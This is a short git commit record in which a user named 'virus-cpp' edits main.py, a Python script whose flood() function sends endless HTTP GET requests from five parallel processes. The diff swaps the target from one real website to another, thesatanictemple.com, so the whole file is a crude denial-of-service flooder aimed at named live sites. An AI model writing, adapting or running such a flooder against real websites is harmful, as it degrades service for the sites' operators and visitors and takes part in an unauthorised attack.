6acea2ea2a4e74e0f6b1d9f34455ec54c4c9d86c
virus-cpp <147293293+virus-cpp@users.noreply.github.com>
2023-12-06 18:38:59 -0500

    Update main.py

--- main.py
+++ main.py
@@ -3,7 +3,7 @@ import requests
 
 def flood():
   while True:
-    requests.get('http://rule34.xxx')
+    requests.get('https://thesatanictemple.com/')
 
 for i in range(5):
   multiprocessing.Process(target=flood).start()
